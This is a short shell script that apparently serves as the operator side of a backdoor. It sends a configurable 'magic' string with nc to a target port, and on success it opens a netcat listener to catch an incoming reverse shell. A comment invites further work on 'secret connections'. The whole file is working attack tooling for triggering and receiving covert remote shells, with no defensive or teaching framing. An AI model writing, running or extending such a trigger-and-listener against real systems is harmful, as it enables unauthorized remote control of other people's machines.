#!/bin/sh

MAGIC="change this magic string"
SERVER_HOST="localhost"
SERVER_MAGIC_PORT=8080

echo "Sending magic packet to $SERVER_HOST:$SERVER_MAGIC_PORT"

# You can edit the nc command, and impliment logic for successful secret connections.
REVERSE_SHELL_CONNECT_PORT=8081
echo "$MAGIC" | nc -c -vvv $SERVER_HOST $SERVER_MAGIC_PORT
if [[ $? -eq 1 ]]; then
    echo "Failed to connect to the host."
    exit 1
fi
 
echo "Success."
echo "Connecting to reverse shell listener on port $REVERSE_SHELL_CONNECT_PORT..."
netcat -vvv -nlp $REVERSE_SHELL_CONNECT_PORT
echo "Exited reverse shell"
exit 0
